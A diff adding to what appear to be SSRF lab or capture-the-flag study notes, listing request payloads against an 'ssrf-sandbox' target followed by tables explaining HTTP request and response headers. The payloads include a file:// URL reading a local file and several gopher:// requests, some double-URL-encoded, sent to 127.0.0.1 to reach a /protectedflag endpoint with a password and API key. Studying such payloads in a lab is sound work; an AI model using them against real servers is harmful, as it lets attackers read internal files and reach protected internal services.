@@ -155,5 +155,58 @@ You only need to double-encode non-alphanumeric and reserved characters, such as
 | `%`       | `%25`      | `%2525`    |
 
 
+```shell
+file:///app/target.txt
+```
+
+```shell
+gopher://127.0.0.1:80/_GET%20/target%20HTTP/1.1%0a
+```
+
+```shell
+gopher%253A%252F%252F127.0.0.1:80/_GET%20/protectedflag%20HTTP/1.1%0apassword%253Dtwasbryllyg%0aapiKey%253chesirecat
+``` 
+
+```shell
+gopher://127.0.0.1:80/_POST%20/protectedflag%20HTTP/1.1%0apassword%253Dtwasbryllyg%0aapiKey%253chesirecat
+```
+
+---
+
+#### 📬 Client Request Headers
+
+| Header                                        | Meaning                                                         |
+| --------------------------------------------- | --------------------------------------------------------------- |
+| `Host: ssrf-sandbox`                          | Target domain or IP the request is being sent to.               |
+| `Connection: keep-alive`                      | Keeps the TCP connection open for reuse, improving performance. |
+| `Upgrade-Insecure-Requests: 1`                | Tells the server to prefer HTTPS over HTTP.                     |
+| `User-Agent: Mozilla/5.0 (...) Firefox/128.0` | Identifies the browser and OS being used.                       |
+| `Accept: text/html,application/xhtml+xml,...` | Lists content types the browser can process.                    |
+| `Accept-Encoding: gzip, deflate`              | Specifies supported compression formats.                        |
+| `Accept-Language: en-US,en;q=0.5`             | Tells the server the user's preferred languages.                |
+| `Priority: u=0, i`                            | HTTP/2 priority hints (low urgency, interactive content).       |
+
+#### 📥 Server Response Headers
+
+| Header                                | Meaning                                    |
+| ------------------------------------- | ------------------------------------------ |
+| `Server: nginx/1.21.4`                | Web server software and version used.      |
+| `Date: Fri, 13 Jun 2025 18:00:06 GMT` | Time the server generated the response.    |
+| `Content-Type: application/json`      | The response is in JSON format.            |
+| `Content-Length: 39`                  | Size of the response body in bytes.        |
+| `Connection: keep-alive`              | The server is keeping the connection open. |
+
+
+#### 🔐 Why These Headers Matter in SSRF or Security Testing
+
+    - Host: — may be manipulated in Host header attacks.
+
+    - User-Agent: — sometimes used for filtering or access control (can be spoofed).
+
+    - Accept/Content-Type: — affects how servers interpret and return data.
+
+    ⁻ Upgrade-Insecure-Requests: — can influence redirects or content served.
+
+    - Connection: — helps keep connections open for faster exploitation in chained SSRF attacks.
 
 
